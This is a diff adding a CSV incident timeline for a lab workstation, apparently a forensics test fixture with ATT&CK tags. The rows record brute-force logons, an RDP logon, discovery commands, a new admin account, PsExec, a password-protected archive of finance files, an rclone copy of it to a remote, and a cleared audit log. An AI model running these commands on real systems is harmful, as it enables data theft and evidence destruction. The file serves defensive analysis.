@@ -1,0 +1,26 @@
+timestamp_utc,host,source,event_type,user,summary,tags,tz_assumed,source_ref
+2026-03-13T15:02:11Z,WS-FIN-07.lab.example,prefetch,execution,,CHROME.EXE executed (previous run; run count 48),,False,prefetch_export.csv:2:PreviousRun1
+2026-03-13T18:20:31Z,WS-FIN-07.lab.example,prefetch,execution,,CHROME.EXE executed (previous run; run count 48),,False,prefetch_export.csv:2:PreviousRun0
+2026-03-13T21:44:09Z,WS-FIN-07.lab.example,prefetch,execution,,CHROME.EXE executed (last run; run count 48),,False,prefetch_export.csv:2:LastRun
+2026-03-14T06:30:02Z,WS-FIN-07.lab.example,evtx,logon,SYSTEM,Successful logon (service) for SYSTEM,,False,evtx_export.csv:2
+2026-03-14T06:58:04Z,WS-FIN-07.lab.example,evtx,logon-failure,administrator,Failed logon for administrator from 203.0.113.45,brute-force:T1110,False,evtx_export.csv:3
+2026-03-14T06:58:31Z,WS-FIN-07.lab.example,evtx,logon-failure,admin,Failed logon for admin from 203.0.113.45,brute-force:T1110,False,evtx_export.csv:4
+2026-03-14T06:59:10Z,WS-FIN-07.lab.example,evtx,logon-failure,jsmith,Failed logon for jsmith from 203.0.113.45,brute-force:T1110,False,evtx_export.csv:5
+2026-03-14T06:59:44Z,WS-FIN-07.lab.example,evtx,logon-failure,svc_backup,Failed logon for svc_backup from 203.0.113.45,brute-force:T1110,False,evtx_export.csv:6
+2026-03-14T07:00:20Z,WS-FIN-07.lab.example,evtx,logon-failure,backup,Failed logon for backup from 203.0.113.45,brute-force:T1110,False,evtx_export.csv:7
+2026-03-14T07:01:02Z,WS-FIN-07.lab.example,evtx,logon-failure,svc_backup,Failed logon for svc_backup from 203.0.113.45,brute-force:T1110,False,evtx_export.csv:8
+2026-03-14T07:02:15Z,WS-FIN-07.lab.example,evtx,logon-failure,mlee,Failed logon for mlee from 10.10.4.22,,False,evtx_export.csv:9
+2026-03-14T07:03:12Z,WS-FIN-07.lab.example,evtx,logon,svc_backup,Successful logon (remote-interactive (RDP)) for svc_backup from 203.0.113.45,rdp-logon:T1021.001,False,evtx_export.csv:10
+2026-03-14T07:05:40Z,WS-FIN-07.lab.example,evtx,process,svc_backup,Process created: C:\Windows\System32\cmd.exe | cmd.exe /c whoami /all,discovery:T1033/T1087,True,evtx_export.csv:11
+2026-03-14T07:05:41Z,WS-FIN-07.lab.example,prefetch,execution,,WHOAMI.EXE executed (last run; run count 1),,False,prefetch_export.csv:3:LastRun
+2026-03-14T07:06:10Z,WS-FIN-07.lab.example,evtx,process,svc_backup,"Process created: C:\Windows\System32\net.exe | net group ""Domain Admins"" /domain",discovery:T1033/T1087,True,evtx_export.csv:12
+2026-03-14T07:09:00Z,WS-FIN-07.lab.example,evtx,account,helpdesk_tmp,User account created: helpdesk_tmp,persistence:T1136.001,False,evtx_export.csv:13
+2026-03-14T07:09:30Z,WS-FIN-07.lab.example,evtx,account,helpdesk_tmp,Member added to security-enabled local group: helpdesk_tmp -> Administrators,privilege:T1098,False,evtx_export.csv:14
+2026-03-14T07:12:00Z,WS-FIN-07.lab.example,evtx,service,,Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe),persistence:T1543.003,False,evtx_export.csv:15
+2026-03-14T07:12:02Z,WS-FIN-07.lab.example,prefetch,execution,,PSEXESVC.EXE executed (last run; run count 1),lateral-movement:T1569.002,False,prefetch_export.csv:4:LastRun
+2026-03-14T07:18:10Z,WS-FIN-07.lab.example,evtx,process,svc_backup,Process created: C:\Users\Public\7z.exe | 7z.exe a -pInfected C:\Users\Public\f.7z C:\Finance\*,archive:T1560.001,False,evtx_export.csv:16
+2026-03-14T07:18:11Z,WS-FIN-07.lab.example,prefetch,execution,,7Z.EXE executed (last run; run count 1),archive:T1560.001,False,prefetch_export.csv:5:LastRun
+2026-03-14T07:22:40Z,WS-FIN-07.lab.example,prefetch,execution,,RCLONE.EXE executed (previous run; run count 2),exfil-tool:T1567.002,False,prefetch_export.csv:6:PreviousRun0
+2026-03-14T07:31:04Z,WS-FIN-07.lab.example,evtx,process,svc_backup,Process created: C:\Users\Public\rclone.exe | rclone.exe copy C:\Users\Public\f.7z remote:bkp --transfers 8,exfil-tool:T1567.002,False,evtx_export.csv:17
+2026-03-14T07:31:05Z,WS-FIN-07.lab.example,prefetch,execution,,RCLONE.EXE executed (last run; run count 2),exfil-tool:T1567.002,False,prefetch_export.csv:6:LastRun
+2026-03-14T07:48:55Z,WS-FIN-07.lab.example,evtx,log-cleared,svc_backup,Security audit log was cleared,defense-evasion:T1070.001,False,evtx_export.csv:19
